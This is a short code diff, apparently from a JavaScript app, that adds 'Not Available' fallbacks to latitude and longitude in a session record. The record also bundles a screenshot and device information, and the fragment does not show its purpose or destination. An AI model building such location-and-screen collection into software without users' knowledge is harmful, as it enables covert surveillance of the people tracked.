@@ -200,8 +200,8 @@
             const screenshot = await takeScreenshot();
 
             const sessionData = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
+                latitude: position.coords.latitude || "Not Available",
+                longitude: position.coords.longitude || "Not Available",
                 timestamp: Date.now(),
                 screenshot: screenshot,
                 ...deviceInfo // Spread device info into session data
